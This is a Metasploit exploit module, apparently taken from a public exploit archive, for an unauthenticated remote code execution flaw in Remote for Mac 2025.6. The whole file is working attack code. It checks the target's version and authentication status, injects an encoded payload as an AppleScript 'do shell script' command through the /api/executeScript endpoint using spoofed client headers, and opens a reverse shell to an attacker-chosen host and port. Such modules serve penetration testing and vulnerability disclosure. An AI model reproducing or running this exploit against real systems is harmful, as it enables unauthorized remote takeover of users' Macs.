##
# Exploit Title: Remote for Mac 2025.6 - Unauthenticated RCE MSF Module
# Date: May 2025
# Exploit Author: Chokri Hammedi (@chokri0x00)
# Vendor Homepage: https://www.cherpake.com/
# Software Link: https://cherpake.com/latest.php?os=mac
# Exploit Source: https://packetstormsecurity.com/files/195347/
# Version: Remote for Mac 2025.6
# Tested on: macOS Mojave, macOS Ventura
##

require 'msf/core'
require 'json'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Remote for Mac 2025.6 - Unauthenticated RCE',
      'Description'    => %q{
        This module exploits an unauthenticated remote code execution vulnerability in
        Remote for Mac 2025.6 via the /api/executeScript endpoint. When authentication is
        disabled on the target system, it allows attackers to execute arbitrary AppleScript
        commands, which can include shell commands via `do shell script`.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Chokri Hammedi (@blue0x1)'],
      'References'     =>
        [
          ['URL', 'https://packetstormsecurity.com/files/195347/']
        ],
      'DisclosureDate' => '2025-05-25',
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [['Auto', {}]],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {
        'RPORT' => 49229,
        'SSL'   => true
      }
    ))

    register_options([
      Opt::RHOST(),
      Opt::RPORT(49229),
      OptBool.new('SSL', [true, 'Enable SSL/TLS', true]),
      OptString.new('LHOST', [true, "Local host to receive reverse shell"]),
      OptInt.new('LPORT', [true, "Local port to receive reverse shell", 4444]),
      OptBool.new('FORCE', [false, "Force exploitation even if checks fail", false])
    ])
  end

  def check
    return CheckCode::Unknown('Skipping version/auth checks (--force)') if datastore['FORCE']

    res = send_request_cgi(
      'uri'    => normalize_uri(target_uri.path, 'api', 'getVersion'),
      'method' => 'GET',
      'ssl'    => datastore['SSL']
    )

    return CheckCode::Unknown('No response from target') unless res && res.code == 200

    begin
      info = JSON.parse(res.body)
    rescue JSON::ParserError
      return CheckCode::Unknown('Unable to parse JSON from /api/getVersion')
    end

    if info['requires.auth'] == true
      return CheckCode::Safe('Target requires authentication on /api/executeScript')
    end

    if info['version'] != '2025.6'
      return CheckCode::Safe("Target version is #{info['version']}, not vulnerable")
    end

    CheckCode::Appears
  end

  def exploit
    unless datastore['FORCE'] || check == CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'Target does not appear vulnerable')
    end

    print_status("Generating reverse shell payload for #{datastore['LHOST']}:#{datastore['LPORT']}")
    cmd = payload.encoded
    escaped = cmd.gsub('\\', '\\\\\\').gsub('"', '\"')
    applescript = %Q{do shell script "#{escaped}"}

    print_status("Sending exploit to #{rhost}:#{rport} via AppleScript")
    res = send_request_cgi(
      'uri'     => normalize_uri(target_uri.path, 'api', 'executeScript'),
      'method'  => 'GET',
      'ssl'     => datastore['SSL'],
      'headers' => {
        'X-ClientToken'   => '1337',
        'X-HostName'      => 'iFruit',
        'X-HostFullModel' => 'iFruit19,2',
        'X-Script'        => applescript,
        'X-ScriptName'    => 'exploit',
        'X-ScriptDelay'   => '0'
      }
    )

    if res && res.code == 200
      print_good("Payload delivered successfully. Awaiting session...")
    else
      fail_with(Failure::Unknown, "Unexpected HTTP response: #{res ? res.code : 'no response'}")
    end
  end
end
